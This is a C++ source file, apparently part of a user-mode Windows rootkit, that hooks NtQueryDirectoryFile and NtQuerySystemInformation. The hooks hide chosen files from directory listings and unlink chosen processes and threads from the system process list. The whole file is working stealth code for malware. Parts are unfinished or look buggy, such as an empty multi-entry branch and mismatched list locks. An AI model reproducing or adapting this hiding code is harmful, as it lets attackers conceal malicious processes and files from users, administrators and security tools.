/* NT Hooks */
#include "rk.h"

namespace hk {
#pragma region NtQueryDirectoryFile
	void* TranslateFICNameToPointer(
		_In_ void* pData,
		_In_ u32   fclass
	) {
		ptr offset;

		switch (fclass) {
		case nt::FileDirectoryInformation:       offset = 64; break;
		case nt::FileFullDirectoryInformation:   offset = 68; break;
		case nt::FileBothDirectoryInformation:   offset = 81; break;
		case nt::FileNamesInformation:           offset = 12; break;
		case nt::FileIdBothDirectoryInformation: offset = 89; break;
		case nt::FileIdFullDirectoryInformation: offset = 76; break;
		default:
			return nullptr;
		}

		return (void*)((ptr)pData + offset);
	}

	nt::NtQueryDirectoryFile_t NtQueryDirectoryFile;
	NTSTATUS NTAPI NtQueryDirectoryFileHook(
		_In_                       HANDLE          FileHandle,
		_In_opt_                   HANDLE          Event,
		_In_opt_                   PVOID           ApcRoutine,
		_In_opt_                   PVOID           ApcContext,
		_Out_                      PVOID           IoStatusBlock,
		_Out_writes_bytes_(Length) PVOID           FileInformation,
		_In_                       ULONG           Length,
		_In_                       ULONG           FileInformationClass,
		_In_                       BOOLEAN         ReturnSingleEntry,
		_In_opt_                   PUNICODE_STRING FileName,
		_In_                       BOOLEAN         RestartScan
	) {
		NTSTATUS s = NtQueryDirectoryFile(FileHandle, Event, ApcRoutine,
			ApcContext, IoStatusBlock, FileInformation, Length,
			FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
		if (!g_FileList->GetItemCount())
			return s;

		constexpr u32 fclass[] = {
			nt::FileDirectoryInformation,
			nt::FileFullDirectoryInformation,
			nt::FileBothDirectoryInformation,
			nt::FileNamesInformation,
			nt::FileIdBothDirectoryInformation,
			nt::FileIdFullDirectoryInformation
		};
		for (u32 i = 0; i < sizeof(fclass) / sizeof(*fclass); i++)
			if (FileInformationClass == fclass[i]) {
				g_FileList->ReadLock();
				if (ReturnSingleEntry) {
					// This Code Hides Single Entry Requests

					const wchar* Entry = (wchar*)g_ProcessList->GetFirstEntry();
					do {
					RedoNext:
						if (!lstrcmpiW((const wchar*)TranslateFICNameToPointer(FileInformation, FileInformationClass), Entry)) {
							s = NtQueryDirectoryFile(FileHandle, Event, ApcRoutine,
								ApcContext, IoStatusBlock, FileInformation, Length,
								FileInformationClass, ReturnSingleEntry, FileName, false);
							goto RedoNext; // redo for next element
						}
					} while (Entry = (wchar*)g_ProcessList->GetNextEntry((void*)Entry));
				} else {
					// This Code will fully unlink Entries from a list of any size (to be imlemented)

				}
				g_FileList->ReadUnlock();

				break;
			}

		return s;
	}
#pragma endregion

#pragma region NtQuerySystemInformation
	status UnlinkProcessEntry(
		_In_ nt::SYSTEM_PROCESS_INFORMATION* spi
	) {
		nt::SYSTEM_PROCESS_INFORMATION* NextEntry = (nt::SYSTEM_PROCESS_INFORMATION*)
			((ptr)spi->NextEntryOffset + (ptr)spi);
		if (NextEntry->NextEntryOffset)
			spi->NextEntryOffset += NextEntry->NextEntryOffset;
		else
			spi->NextEntryOffset = 0;

		return spi->NextEntryOffset;
	}
	status UnlinkThreadEntry(
		_In_ nt::SYSTEM_PROCESS_INFORMATION* spi,
		_In_     u32                      TId
	) {
		nt::SYSTEM_THREAD_INFORMATION* stit = (nt::SYSTEM_THREAD_INFORMATION*)(spi + 1);

		for (u16 i = 0; i < spi->NumberOfThreads; i++)
			if ((u32)stit[i].ClientId.UniqueThread == TId) {
				__movsb((byte*)(stit + i), (byte*)(stit + (i + 1)), sizeof(*stit) * (spi->NumberOfThreads - (i - 1)));
				spi->NumberOfThreads--;
				return 0;
			}

		return -1; // ThreadId not Found
	}

	nt::NtQuerySystemInformation_t NtQuerySystemInformation;
	NTSTATUS NTAPI NtQuerySystemInformationHook(
		_In_      ULONG  SystemInformationClass,
		_Out_     PVOID  SystemInformation,
		_In_      ULONG  SystemInformationLength,
		_Out_opt_ PULONG ReturnLength
	) {
		NTSTATUS s = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

		// Execute hook if SystemProcessInformation and atleast one Entry exists
		if (SystemInformationClass == 0x05 && SystemInformationLength >= sizeof(nt::SYSTEM_PROCESS_INFORMATION)) {
			if (!g_ProcessList->GetItemCount())
				return s; // No Items to Hide

			// Setup first Process Entry
			nt::SYSTEM_PROCESS_INFORMATION* PreviousEntry = (nt::SYSTEM_PROCESS_INFORMATION*)SystemInformation;
			do {
				if (!PreviousEntry->NextEntryOffset)
					break;

				g_ProcessList->ReadLock();

			RedoNext:
				// The current Entry in the List to be inspected
				nt::SYSTEM_PROCESS_INFORMATION* CurrentEntry = (nt::SYSTEM_PROCESS_INFORMATION*)
					((ptr)PreviousEntry->NextEntryOffset + (ptr)PreviousEntry);

				void* Entry = g_ProcessList->GetFirstEntry();
				do {
					// Check if Data is a Process Entry
					if (*(u8*)Entry != 0)
						continue;
					u32 PId = *(u32*)((ptr)Entry + 1);

					// Unlink Entry if match
					if (PId == (u32)CurrentEntry->UniqueProcessId) {
						if (!UnlinkProcessEntry(PreviousEntry))
							break;

						goto RedoNext; // redo for next element
					}
				} while (Entry = g_ProcessList->GetNextEntry(Entry));



				// Unlink Threads from List here
				Entry = g_ProcessList->GetFirstEntry();
				do {
					// Check if Data is a ProcessThread Entry
					if (*(u8*)Entry != 1)
						continue;

					u32 PId = *(u32*)((ptr)Entry + 1);
					if ((u32)CurrentEntry->UniqueProcessId == PId)
						UnlinkThreadEntry(CurrentEntry, *(u32*)((ptr)Entry + 5));
				} while (Entry = g_ProcessList->GetNextEntry(Entry));

				g_ProcessList->ReadUnlock();
				PreviousEntry = CurrentEntry;
			} while (PreviousEntry->NextEntryOffset);
		}

		return s;
	}
#pragma endregion
}
